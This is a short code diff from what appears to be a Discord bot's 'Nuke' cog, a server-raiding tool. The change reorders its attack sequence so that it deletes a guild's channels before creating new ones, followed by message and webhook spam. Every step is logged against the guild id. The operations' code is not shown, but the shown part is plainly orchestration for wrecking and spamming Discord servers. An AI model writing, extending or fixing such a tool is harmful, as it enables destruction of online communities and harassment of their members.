@@ -27,10 +27,10 @@ class Nuke(commands.Cog):
         try:
             logging.info(f"[nuke] mess_server -> {guild.id}")
             await self.operations.mess_server(guild)
-            logging.info(f"[nuke] CrChannel -> {guild.id}")
-            await self.operations.CrChannel(guild)
             logging.info(f"[nuke] DelChannels -> {guild.id}")
             await self.operations.DelChannels(guild)
+            logging.info(f"[nuke] CrChannel -> {guild.id}")
+            await self.operations.CrChannel(guild)
             logging.info(f"[nuke] spam -> {guild.id}")
             await self.operations.spam(guild)
             logging.info(f"[nuke] spam_webhook -> {guild.id}")
